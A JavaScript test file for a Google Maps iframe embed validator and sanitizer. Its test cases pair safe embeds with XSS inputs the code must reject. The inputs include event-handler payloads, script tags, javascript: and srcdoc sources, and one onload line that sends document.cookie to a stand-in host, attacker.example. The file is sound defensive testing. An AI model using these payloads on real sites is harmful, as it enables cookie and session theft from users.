import {
  isValidGoogleMapEmbed,
  sanitizeGoogleMapEmbed,
} from './google-map-embed.util.js';

const SAFE_SRC =
  'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1!2d44.5!3d40.1';

describe('google-map-embed.util (e2e-bug.49)', () => {
  it.each([
    {
      id: 'safe-minimal',
      html: `<iframe src="${SAFE_SRC}"></iframe>`,
      expectValid: true,
    },
    {
      id: 'safe-with-attrs',
      html: `<iframe src="${SAFE_SRC}" width="600" height="450" style="border:0" allowfullscreen loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>`,
      expectValid: true,
    },
    {
      id: 'xss-onload',
      html: `<iframe src="${SAFE_SRC}" onload="fetch('https://attacker.example/steal?c='+document.cookie)"></iframe>`,
      expectValid: false,
    },
    {
      id: 'xss-onerror',
      html: `<iframe src="${SAFE_SRC}" onerror="alert(1)"></iframe>`,
      expectValid: false,
    },
    {
      id: 'xss-onmouseover',
      html: `<iframe src="${SAFE_SRC}" onmouseover="alert(1)"></iframe>`,
      expectValid: false,
    },
    {
      id: 'script-tag',
      html: `<iframe src="${SAFE_SRC}"></iframe><script>alert(1)</script>`,
      expectValid: false,
    },
    {
      id: 'javascript-src',
      html: `<iframe src="javascript:alert(1)"></iframe>`,
      expectValid: false,
    },
    {
      id: 'non-google-src',
      html: `<iframe src="https://evil.example/maps/embed"></iframe>`,
      expectValid: false,
    },
    {
      id: 'http-not-https',
      html: `<iframe src="http://www.google.com/maps/embed?pb=x"></iframe>`,
      expectValid: false,
    },
    {
      id: 'nested-content',
      html: `<iframe src="${SAFE_SRC}"><script>alert(1)</script></iframe>`,
      expectValid: false,
    },
    {
      id: 'srcdoc',
      html: `<iframe src="${SAFE_SRC}" srcdoc="<script>alert(1)</script>"></iframe>`,
      expectValid: false,
    },
  ])('$id', ({ html, expectValid }) => {
    expect(isValidGoogleMapEmbed(html)).toBe(expectValid);
    if (expectValid) {
      expect(sanitizeGoogleMapEmbed(html)).toMatch(/^<iframe\b/i);
      expect(sanitizeGoogleMapEmbed(html)).toContain('src=');
    } else {
      expect(sanitizeGoogleMapEmbed(html)).toBeNull();
    }
  });

  it('strips disallowed attrs while keeping a safe src (via reject, not partial keep of on*)', () => {
    // on* must fail closed — never partially sanitize an XSS attempt into "valid"
    expect(
      sanitizeGoogleMapEmbed(
        `<iframe src="${SAFE_SRC}" onload="alert(1)" width="600"></iframe>`,
      ),
    ).toBeNull();
  });

  it('rebuilds allowlisted embed without event handlers', () => {
    const out = sanitizeGoogleMapEmbed(
      `<iframe src="${SAFE_SRC}" width="600" height="450" style="border:0;" allowfullscreen></iframe>`,
    );
    expect(out).toBe(
      `<iframe src="${SAFE_SRC}" width="600" height="450" style="border:0;" allowfullscreen></iframe>`,
    );
  });
});
